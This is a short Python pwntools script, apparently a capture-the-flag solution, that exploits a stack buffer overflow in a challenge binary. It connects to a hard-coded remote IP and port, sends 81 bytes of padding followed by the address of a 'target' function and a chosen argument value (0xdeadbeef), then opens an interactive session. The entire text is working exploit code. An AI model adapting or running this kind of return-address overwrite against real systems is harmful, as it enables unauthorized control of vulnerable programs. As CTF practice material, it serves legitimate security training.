from pwn import *

context.binary = './chall'
elf = context.binary

p = remote('152.118.201.241', 3013)

offset = 81

target = elf.symbols['target']

payload = b"A"*offset
payload += p32(target)
payload += b"BBBB"
payload += p32(0xdeadbeef)

p.sendline(payload)
p.interactive()